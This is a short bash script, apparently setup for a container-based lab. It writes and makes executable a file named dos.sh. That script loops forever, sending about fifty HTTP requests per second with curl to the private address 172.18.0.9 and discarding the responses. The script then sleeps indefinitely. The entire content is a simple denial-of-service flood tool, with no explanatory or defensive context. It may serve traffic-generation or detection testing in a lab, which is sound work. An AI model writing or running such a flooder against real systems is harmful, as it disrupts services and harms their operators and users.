#!/bin/bash

cat <<'EOF' > "/usr/local/bin/dos.sh"
#!/bin/bash
while true; do
  for i in $( seq 1 50 ); do
    curl http://172.18.0.9 > /dev/null 2>&1
  done
  sleep 1
done

EOF
chmod +x "/usr/local/bin/dos.sh"
sleep 9999999
/bin/bash
